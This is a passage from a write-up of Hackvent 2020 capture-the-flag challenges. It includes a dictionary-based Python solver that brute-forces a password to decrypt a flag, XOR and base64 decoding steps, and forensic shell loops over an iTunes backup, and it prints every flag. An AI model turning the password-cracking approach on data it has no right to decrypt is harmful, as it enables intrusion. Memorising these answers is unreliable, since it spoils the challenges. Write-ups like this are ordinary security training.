<span id="cb93-9"><a href="#cb93-9"></a>        i <span class="op">=</span> <span class="dv">0</span></span>
<span id="cb93-10"><a href="#cb93-10"></a>        p <span class="op">=</span> <span class="st">&quot;start&quot;</span></span>
<span id="cb93-11"><a href="#cb93-11"></a>        <span class="cf">while</span> p <span class="op">!=</span> <span class="st">&quot;&quot;</span> <span class="kw">or</span> i <span class="op">&lt;</span> <span class="dv">2000000</span>:</span>
<span id="cb93-12"><a href="#cb93-12"></a>            i <span class="op">+=</span> <span class="dv">1</span></span>
<span id="cb93-13"><a href="#cb93-13"></a>            p <span class="op">=</span> fd.readline()[:<span class="op">-</span><span class="dv">1</span>]</span>
<span id="cb93-14"><a href="#cb93-14"></a>            h <span class="op">=</span> calc_hash(<span class="bu">bytes</span>(p, <span class="st">&#39;utf-8&#39;</span>))</span>
<span id="cb93-15"><a href="#cb93-15"></a>            flag <span class="op">=</span> decrypt(flag_enc, h)</span>
<span id="cb93-16"><a href="#cb93-16"></a>            <span class="cf">if</span> flag.startswith(<span class="st">&#39;HV20&#39;</span>):</span>
<span id="cb93-17"><a href="#cb93-17"></a>                <span class="co"># print(&quot;#######&quot;)</span></span>
<span id="cb93-18"><a href="#cb93-18"></a>                <span class="bu">print</span>(<span class="st">&quot;</span><span class="sc">%%%%%%</span><span class="st"> Success?!&quot;</span>)</span>
<span id="cb93-19"><a href="#cb93-19"></a>                <span class="bu">print</span>(<span class="st">&quot;Password: </span><span class="sc">%s</span><span class="st">&quot;</span> <span class="op">%</span> p)</span>
<span id="cb93-20"><a href="#cb93-20"></a>                <span class="bu">print</span>(<span class="st">&quot;Flag: </span><span class="sc">%s</span><span class="st">&quot;</span> <span class="op">%</span> flag)</span>
<span id="cb93-21"><a href="#cb93-21"></a>                <span class="cf">break</span></span>
<span id="cb93-22"><a href="#cb93-22"></a>            <span class="cf">if</span> (i <span class="op">%</span> <span class="dv">10000</span>) <span class="op">==</span> <span class="dv">0</span>:</span>
<span id="cb93-23"><a href="#cb93-23"></a>                <span class="bu">print</span>(<span class="st">&quot;Computed entry </span><span class="sc">%s</span><span class="st"> (</span><span class="sc">%s</span><span class="st">).&quot;</span> <span class="op">%</span> (<span class="bu">str</span>(i), p))</span>
<span id="cb93-24"><a href="#cb93-24"></a></span>
<span id="cb93-25"><a href="#cb93-25"></a>    <span class="bu">print</span>(<span class="st">&quot;THE END&quot;</span>)</span>
<span id="cb93-26"><a href="#cb93-26"></a></span>
<span id="cb93-27"><a href="#cb93-27"></a></span>
<span id="cb93-28"><a href="#cb93-28"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&#39;__main__&#39;</span>:</span>
<span id="cb93-29"><a href="#cb93-29"></a>    <span class="co"># test_decrypt()</span></span>
<span id="cb93-30"><a href="#cb93-30"></a>    <span class="co"># test_calc_hash()</span></span>
<span id="cb93-31"><a href="#cb93-31"></a>    main()</span></code></pre></div>
<p>Running this solver prints the flag and reveals Santa's password to be <code>xmasrocks</code>.</p>
<p>The complete solver is available <a href="./dec24.tar.gz">here</a>.</p>
<h2 id="tools-15">Tools</h2>
<ul>
<li>readelf</li>
<li>strings</li>
<li>Ghidra</li>
<li>gdb</li>
</ul>
<h2 id="flag-23">Flag</h2>
<p><code>HV20{0h_n0es_fl4g_g0t_l34k3d!1}</code></p>
<h1 id="hv20h1-its-a-secret">HV20.H1 It's a secret!</h1>
<h2 id="approach-23">Approach</h2>
<p>The first hidden flag is found in day 3.</p>
<p>To find it, one had to decrypt and inflate all encrypted files and go through them individually. File <code>0042.bin</code> revealed a little surprise.</p>
<h2 id="flag-24">Flag</h2>
<p><code>HV20{it_is_always_worth_checking_everywhere_and_congratulations,_you_have_found_a_hidden_flag}</code></p>
<h1 id="hv20h2-oh-another-secret">HV20.H2 Oh, another secret!</h1>
<p>Hidden 2 was (not so) hidden in Dec14's challenge.</p>
<p>Looking a bit closer what happens in the MBR using Ghidra shows that there's two arrays of values being XORed:</p>
<p>At 0xf4: <code>58 57 97 83 6f 65 76 36 5e 67 5d 64 4d 3c a5 75 f3 7c e0 1f 06 d1 ad 66 24 78 3c a3 e7</code> ...and staring 0x9e: <code>55 5d df d5 5d 55 0d 5e 6f 03 39 57 23 11 94 1b de 0c 8c 2b 37 bf 80 53 15 4e 54 94 9a</code></p>
<h2 id="flag-25">Flag</h2>
<p><code>HV20{h1dd3n-1n-pl41n-516h7}</code></p>
<h1 id="hv20h3-hidden-in-plain-sight">HV20.H3 Hidden in Plain Sight</h1>
<h2 id="approach-24">Approach</h2>
<p>The flag came with the challenge on Dec23. We start at the point where we have the backup contents decrypted and available. $PWD is at the root of the backup folder.</p>
<p>Various searches have lead to nowhere:</p>
<div class="sourceCode" id="cb94"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb94-1"><a href="#cb94-1"></a><span class="kw">for</span> <span class="ex">f</span> in <span class="va">$(</span><span class="fu">find</span> -type f <span class="kw">|</span> <span class="fu">grep</span> sqlite<span class="va">)</span><span class="kw">;</span> <span class="kw">do</span> <span class="va">TABLES=$(</span><span class="ex">sqlite3</span> -list  <span class="va">$f</span> <span class="st">&#39;.tables&#39;</span><span class="va">)</span>; <span class="kw">for</span> <span class="ex">t</span> in <span class="va">$TABLES</span><span class="kw">;</span> <span class="kw">do</span> <span class="bu">echo</span> <span class="st">&quot;### </span><span class="va">$f</span><span class="st"> - </span><span class="va">$t</span><span class="st"> ###&quot;</span><span class="kw">;</span> <span class="ex">sqlite3</span> <span class="va">$f</span> <span class="st">&quot;select * from </span><span class="va">$t</span><span class="st">;&quot;</span><span class="kw">;</span> <span class="kw">done</span> ; <span class="kw">done</span> <span class="op">&gt;</span> <span class="ex">db.dump</span></span></code></pre></div>
<div class="sourceCode" id="cb95"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb95-1"><a href="#cb95-1"></a><span class="kw">for</span> <span class="ex">f</span> in <span class="va">$(</span><span class="fu">find</span> -type f <span class="kw">|</span> <span class="fu">grep</span> storedata<span class="va">)</span><span class="kw">;</span> <span class="kw">do</span> <span class="va">TABLES=$(</span><span class="ex">sqlite3</span> -list  <span class="va">$f</span> <span class="st">&#39;.tables&#39;</span><span class="va">)</span>; <span class="kw">for</span> <span class="ex">t</span> in <span class="va">$TABLES</span><span class="kw">;</span> <span class="kw">do</span> <span class="bu">echo</span> <span class="st">&quot;### </span><span class="va">$f</span><span class="st"> - </span><span class="va">$t</span><span class="st"> ###&quot;</span><span class="kw">;</span> <span class="ex">sqlite3</span> <span class="va">$f</span> <span class="st">&quot;select * from </span><span class="va">$t</span><span class="st">;&quot;</span><span class="kw">;</span> <span class="kw">done</span> ; <span class="kw">done</span> <span class="op">&gt;</span> <span class="ex">db.dump</span></span></code></pre></div>
<div class="sourceCode" id="cb96"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb96-1"><a href="#cb96-1"></a><span class="fu">find</span> -type f -iname *.png</span>
<span id="cb96-2"><a href="#cb96-2"></a><span class="co"># ./AppDomain-com.apple.mobilesafari/Library/Safari/Thumbnails/C6467A5D-4E96-45DB-9806-21931105D87C.png</span></span></code></pre></div>
<div class="sourceCode" id="cb97"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb97-1"><a href="#cb97-1"></a><span class="fu">find</span> -type f -iname *.jpg</span>
<span id="cb97-2"><a href="#cb97-2"></a><span class="kw">for</span> <span class="ex">f</span> in <span class="va">$(</span><span class="fu">find</span> -type f -iname *.mp4<span class="va">)</span><span class="kw">;</span> <span class="kw">do</span> <span class="ex">exiftool</span> <span class="va">$f</span><span class="kw">;</span> <span class="ex">binwalk</span> <span class="va">$f</span><span class="kw">;</span> <span class="fu">strings</span> <span class="va">$f</span> <span class="kw">|</span><span class="fu">grep</span> <span class="st">&#39;HV20&#39;</span><span class="kw">;</span> <span class="kw">done</span></span></code></pre></div>
<div class="sourceCode" id="cb98"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb98-1"><a href="#cb98-1"></a><span class="co"># Find all different file types in the folder</span></span>
<span id="cb98-2"><a href="#cb98-2"></a><span class="kw">for</span> <span class="ex">f</span> in <span class="va">$(</span><span class="fu">find</span> -type f<span class="va">)</span><span class="kw">;</span> <span class="kw">do</span> <span class="fu">file</span> -b <span class="va">$f</span><span class="kw">;</span> <span class="kw">done</span> <span class="kw">|</span> <span class="fu">sort</span> <span class="kw">|</span> <span class="fu">uniq</span> <span class="kw">|</span> <span class="fu">less</span></span></code></pre></div>
<div class="sourceCode" id="cb99"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb99-1"><a href="#cb99-1"></a><span class="co"># Convert all Apple binary property list files to XML</span></span>
<span id="cb99-2"><a href="#cb99-2"></a><span class="kw">for</span> <span class="ex">f</span> in <span class="va">$(</span><span class="fu">find</span> -type f<span class="va">)</span><span class="kw">;</span> <span class="kw">do</span> <span class="va">$(</span><span class="fu">file</span> -b <span class="va">$f</span> <span class="kw">|</span> <span class="fu">grep</span> -qi <span class="st">&#39;Apple binary&#39;</span><span class="va">)</span> <span class="kw">||</span> <span class="bu">continue</span><span class="kw">;</span> <span class="bu">echo</span> <span class="st">&quot;#### </span><span class="va">$f</span><span class="st"> ####&quot;</span><span class="kw">;</span> <span class="ex">plistutil</span> -i <span class="va">$f</span><span class="kw">;</span> <span class="kw">done</span> <span class="kw">|</span> <span class="fu">less</span></span></code></pre></div>
<p>And finally...:</p>
<div class="sourceCode" id="cb100"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb100-1"><a href="#cb100-1"></a><span class="kw">for</span> <span class="ex">f</span> in <span class="va">$(</span><span class="fu">find</span> -type f<span class="va">)</span><span class="kw">;</span> <span class="kw">do</span> <span class="va">$(</span><span class="fu">file</span> -b <span class="va">$f</span> <span class="kw">|</span> <span class="fu">grep</span> -qi <span class="st">&#39;sqlite&#39;</span><span class="va">)</span> <span class="kw">||</span> <span class="bu">continue</span><span class="kw">;</span> <span class="bu">echo</span> <span class="st">&quot;#### </span><span class="va">$f</span><span class="st"> ####&quot;</span><span class="kw">;</span> <span class="fu">strings</span> <span class="va">$f</span><span class="kw">;</span> <span class="kw">done</span> <span class="kw">|</span> <span class="fu">less</span></span></code></pre></div>
<p>A base64-looking string jumped to my eye in this output...</p>
<div class="sourceCode" id="cb101"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb101-1"><a href="#cb101-1"></a><span class="fu">strings</span> ./HomeDomain/Library/AddressBook/AddressBook.sqlitedb</span>
<span id="cb101-2"><a href="#cb101-2"></a><span class="co"># includes: &quot;http://SFYyMHtpVHVuM3NfYmFja3VwX2YwcmVuc2l4X0ZUV30=C66731B8-44AE-469B-9086-18A3A1F796B0&quot;</span></span>
<span id="cb101-3"><a href="#cb101-3"></a><span class="bu">echo</span> <span class="st">&quot;SFYyMHtpVHVuM3NfYmFja3VwX2YwcmVuc2l4X0ZUV30=&quot;</span> <span class="kw">|</span> <span class="ex">base64</span> -d  <span class="co"># Produces the flag.</span></span></code></pre></div>
<p>Sometimes it's worth the effort grepping for a ROT13 or, like in this case, a base64 encoded flag (or its prefix).</p>
<h2 id="tools-16">Tools</h2>
<ul>
<li>plistutil - a tool to convert Apple property list files from binary to XML and vice-versa (Ubuntu package <code>libplist-utils</code>)</li>
<li>strings</li>
<li>binwalk</li>
<li>exiftool</li>
<li>pngchunks</li>
</ul>
<h2 id="flag-26">Flag</h2>
<p><code>HV20{iTun3s_backup_f0rensix_FTW}</code></p>
<h1 id="hv20-1-twelve-steps-of-christmas">HV20.(-1) Twelve steps of christmas</h1>
<table>
<thead>
<tr class="header">
<th><!-- --></th>
<th><!-- --></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>Author</strong></td>
<td>Bread</td>
</tr>
<tr class="even">
<td><strong>Level</strong></td>
<td>easy</td>
</tr>
<tr class="odd">
<td><strong>Categories</strong></td>
<td><code>fun</code></td>
</tr>
</tbody>
</table>
<h2 id="description-24">Description</h2>
<p>On the third day of christmas my true love sent to me...</p>
<p>three caesar salads, two to (the) six arguments, one quick response.</p>
<p><a href="./db47d0fc-3dde-4f97-9362-df01946699d9.txt">Message</a></p>
<h2 id="approach-25">Approach</h2>
<p>Upon first reading the challenge the three lines rang a bell, there was some Caesar code involved, something something six arguments and a quick response (so a QR code). Only the middle verse was not instantly clear to me, so I tried the obvious: compute 2^6, which is 64 - which must be related to base64.</p>
<p>Applying Caesar code with a rotation of 3, followed by a base64 decode and saving the outcome in a file ending in "png" (you could see the format from the file's magic bytes), one could see a QR code shine through, which did - however - not have a high enough contrast. Correcting this with an image manipulation program, I was able to scan the code and get the flag.</p>
<p>ROT 3 on initial message: <code>Verse 3 done! Off with you! Get back to work! You're not done here...</code></p>
<h2 id="tools-involved">Tools involved</h2>
<ul>
<li>Cyberchef</li>
<li>Binary eye</li>
<li>GIMP</li>
</ul>
<h2 id="flag-27">Flag</h2>
<p><code>HV20{34t-sl33p-haxx-rep34t}</code></p>
</body>
</html>
